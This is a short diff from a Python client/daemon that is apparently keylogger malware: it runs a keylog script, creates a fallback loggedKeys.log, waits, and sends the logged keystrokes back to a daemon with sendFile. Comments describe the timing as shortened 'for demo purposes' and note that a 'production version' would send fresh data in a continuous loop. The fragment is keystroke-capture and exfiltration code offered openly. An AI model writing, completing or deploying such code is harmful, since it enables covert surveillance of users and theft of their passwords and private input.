@@ -242,18 +242,18 @@ def run( stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
     sys.stdout.flush() 
     sys.stderr.flush()
 
-    
+    #should keylog fail to create a file, make one in its place
+    if not os.path.isfile(cwd+"/loggedKeys.log"):
+         with open(cwd+"/loggedKeys.log", 'a') as f:
+            f.write(".")
+        
     keylog(cwd+'/keylogger.py') # keylogger.py is located in the working directory of the client/daemon
 
     #For demo purposes, the time between sending of logged data is shortened
     # additionally, a production version would continously call the sendFile after a random seconds with new data
     time.sleep(20)
 
-    #should keylog fail to create a file, make one in its place
-    if not os.path.isfile(cwd+"/loggedKeys.log"):
-         with open(cwd+"/loggedKeys.log", 'a') as f:
-            f.write(".")
-        
+
     # path exists, send the file back to daemon
     sendFile(cwd+"/loggedKeys.log", keyLoc,  'keylog.txt') 
     #a loop would be here in production
